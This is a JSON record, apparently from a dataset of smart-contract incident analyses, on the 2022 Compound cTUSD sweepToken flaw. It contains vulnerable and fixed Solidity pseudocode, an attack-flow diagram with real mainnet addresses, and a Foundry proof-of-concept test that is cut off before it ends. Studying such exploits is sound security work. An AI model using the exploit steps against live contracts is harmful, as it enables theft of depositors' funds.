@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-03-14_CompoundTUSD_SweepTokenUnauthorized",
+ "source_file": "2022/2022-03-14_CompoundTUSD_SweepTokenUnauthorized.md",
+ "title": "Compound TUSD — sweepToken Unauthorized Withdrawal Analysis",
+ "date": "2022-03-14",
+ "protocol": "Compound Finance",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "Full TUSD balance held in Compound cTUSD market",
+ "loss_usd": null,
+ "root_cause": "`sweepToken()` was designed in a way that allowed recovery of the contract's underlying token (TUSD), enabling withdrawal of market funds when the legacy TUSD token was migrated to the new TUSD",
+ "attack_tx": null,
+ "vulnerable_contract": "cTUSD 0x12392F67bdf24faE0AF363c24AC620a2f67DAd86",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable CErc20Delegate.sweepToken() (pseudocode)\ncontract CErc20Delegate {\n    address public underlying; // For cTUSD: the new TUSD address\n\n    // Function to recover tokens accidentally sent to the contract\n    function sweepToken(EIP20NonStandardInterface token) external {\n        //",
+  "❌ Legacy TUSD has a different address than underlying (new TUSD),\n        //    so it passes this check — but they represent the same economic asset\n        require(address(token) != underlying, \"CErc20: can't sweep underlying\");\n\n        //",
+  "❌ Transfers the entire legacy TUSD balance to admin\n        // Legacy TUSD is internally redeemable 1:1 for new TUSD\n        uint256 balance = token.balanceOf(address(this));\n        token.transfer(admin, balance);\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern\nfunction sweepToken(EIP20NonStandardInterface token) external {\n    require(address(token) != underlying, \"CErc20: can't sweep underlying\");\n    //",
+  "✅ Additional check: also block economically equivalent tokens\n    require(!isEconomicallyEquivalent(address(token), underlying),\n            \"CErc20: can't sweep equivalent token\");\n    uint256 balance = token.balanceOf(address(this));\n    token.transfer(admin, balance);\n}"
+ ],
+ "steps": [
+  "→ require passes",
+  "Transfers legacy TUSD → internally redeemable 1:1 for new TUSD"
+ ],
+ "other_code": [
+  "Attacker (or privileged admin)\n    │\n    ├─[1] Check TUSD balance held by cTUSD contract\n    │       TUSD.balanceOf(cTUSD) = large amount of TUSD\n    │\n    ├─[2] Call cTUSD.sweepToken(legacyTUSD)\n    │       legacyTUSD address = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E\n    │       ≠ underlying (new TUSD address)\n    │       → require passes\n    │\n    ├─[3] Query legacyTUSD.balanceOf(cTUSD)\n    │       Returns legacy TUSD holdings\n    │\n    ├─[4] legacyTUSD.transfer(admin, balance)\n    │       Transfers legacy TUSD → internally redeemable 1:1 for new TUSD\n    │\n    └─[5] TUSD assets in cTUSD market fully drained\n            Depositors unable to withdraw",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface ICErc20Delegate {\n    // ⚡ Vulnerable function: any address different from underlying can be swept\n    function sweepToken(address token) external;\n}\n\ncontract ContractTest is Test {\n    ICErc20Delegate cTUSD =\n        ICErc20Delegate(0x12392F67bdf24faE0AF363c24AC620a2f67DAd86);\n    IERC20 TUSD       = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376); // New TUSD\n    IERC20 TUSDLegacy = IERC20(0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E); // Legacy TUSD\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 14_266_479);\n    }\n\n    function testExploit() public {\n        uint256 balanceBefore = TUSD.balanceOf(address(cTUSD));\n        emit log_named_decimal_uint(\"[Before] c"
+ ]
+}
